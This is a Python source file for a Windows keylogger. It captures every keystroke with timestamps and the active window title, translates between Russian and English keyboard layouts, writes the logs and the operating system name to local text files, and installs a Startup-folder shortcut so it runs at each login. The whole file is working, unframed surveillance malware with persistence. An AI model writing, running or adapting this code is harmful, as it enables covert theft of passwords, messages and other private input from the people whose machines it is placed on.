import datetime
import platform
import os
import getpass
import os.path

from ctypes import *
from datetime import datetime
from pynput import keyboard
from pynput.keyboard import Key, Listener
from win32com.client import Dispatch

user32 = windll.user32
USER_NAME = getpass.getuser()
name_last_active_window = ""
file_path = os.path.dirname(os.path.realpath(__file__))
if not os.path.exists("%s\logs" % file_path):
    os.mkdir("%s\logs" % file_path)
path = r"%s\logs" % file_path
num_files = len([f for f in os.listdir(path)
                 if os.path.isfile(os.path.join(path, f))])

COMBINATION = {keyboard.Key.ctrl}
current = set()

hwnd = user32.GetForegroundWindow()
threadID = user32.GetWindowThreadProcessId(hwnd, None)
StartLang = user32.GetKeyboardLayout(threadID)
print(StartLang)

eng_chars = u"~!@#$%^&qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"|ZXCVBNM<>?"
rus_chars = u"ё!\"№;%:?йцукенгшщзхъфывапролджэячсмитьбю.ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭ/ЯЧСМИТЬБЮ,"
trans_table_en_ru = dict(zip(eng_chars, rus_chars))
trans_table_ru_en = dict(zip(rus_chars, eng_chars))


def change_en_ru(s):
    return u''.join([trans_table_en_ru.get(c, c) for c in s])


def change_ru_en(s):
    return u''.join([trans_table_ru_en.get(c, c) for c in s])


def add_to_startup():
    startup_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    path = os.path.join(startup_path, "start.lnk")
    file_path = os.path.dirname(os.path.realpath(__file__))
    target = r"%s\start.vbs" % file_path
    w_dir = file_path
    icon = r"%s\start.vbs" % file_path
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(path)
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = w_dir
    shortcut.IconLocation = icon
    shortcut.save()


def get_active_window():
    import win32gui
    window = win32gui.GetForegroundWindow()
    active_window_name = win32gui.GetWindowText(window)
    return active_window_name


def on_press(key):
    print("{0} pressed".format(key))
    write_file(key)


def write_file(key):
    global name_last_active_window
    file = r"%s\log%s.txt" % (path, (num_files + 1))
    f = open(file, "a", encoding='utf-8')
    f.write("\n")
    active_window = str(get_active_window())

    if name_last_active_window != active_window:
        f.write("\n")
        f.write(f"Active window: {active_window}")
        now_time = datetime.now().time().replace(microsecond=0)
        f.write(" ")
        f.write(str(now_time))
        f.write("\n")

    name_last_active_window = active_window
    hwnd = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(hwnd, None)
    code_lang = user32.GetKeyboardLayout(thread_id)
    k = str(key).replace("'", "")
    ru_lang = [68748313, 68758528, 68757504, 68749337, 68756480]
    en_lang = [67699721, 134809609, 67707913, 67708937, 67701769, 1074348041, 67702793, 403249161,
               67706889, 67716105, 67703817, 67712009, 67717129, 67705865, 67709961, 67710985, 67718153]
    if StartLang in en_lang:
        if code_lang in ru_lang and k.find("Key") == -1:
            k = change_en_ru(k)
    elif StartLang in ru_lang:
        if code_lang in en_lang and k.find("Key") == -1:
            k = change_ru_en(k)
    now_time = datetime.now().time().replace(microsecond=0)
    f.write(str(now_time))
    f.write(' ')
    f.write(k)
    f.close()


def on_release(key):
    if key == Key.esc:
        return False


def main():
    add_to_startup()
    OS = platform.platform()
    file = r"%s\log%s.txt" % (path, (num_files + 1))
    f = open(file, "w", encoding='utf-8')
    f.write("Operating system: ")
    f.write(OS)
    f.write("\n")
    now_data = datetime.now().date()
    f.write(str(now_data))
    f.close()


if __name__ == "__main__":
    main()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
